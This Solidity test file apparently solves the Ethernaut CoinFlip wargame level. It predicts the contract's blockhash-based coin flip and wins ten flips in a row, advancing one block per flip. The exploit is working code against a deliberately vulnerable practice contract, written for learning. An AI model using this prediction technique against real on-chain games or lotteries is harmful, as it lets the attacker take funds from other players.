// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {CoinFlip} from "../../src/CoinFlip/Level.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

interface ICoinFlip {
  function flip(bool) external returns (bool);

  function consecutiveWins() external returns (uint256);
}

contract CoinFlipTest is LevelFactory {
  using SafeMath for uint256;
  ICoinFlip coinflip;

  function setUp() public {
    vm.prank(deployer); // deploy the contract as deployer
    coinflip = ICoinFlip(address(new CoinFlip()));
  }

  function testAttack() public {
    submitLevel("CoinFlip");
  }

  function _performTest() internal override {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;
    for (uint256 i; i < 10; i++) {
      uint256 blockValue = uint256(blockhash(block.number.sub(1)));
      require(blockValue != lastHash, "Same block");
      lastHash = blockValue;
      uint256 coinFlip = blockValue.div(FACTOR);
      bool side = coinFlip == 1 ? true : false;
      coinflip.flip(side);
      vm.roll(block.number.add(1));
    }
  }

  function _setupTest() internal override {
    super._setupTest();
  } 

  function _checkTest() internal override returns (bool) {
    assertGe(coinflip.consecutiveWins(), 10);

    return (coinflip.consecutiveWins() >= 10);
  }
}
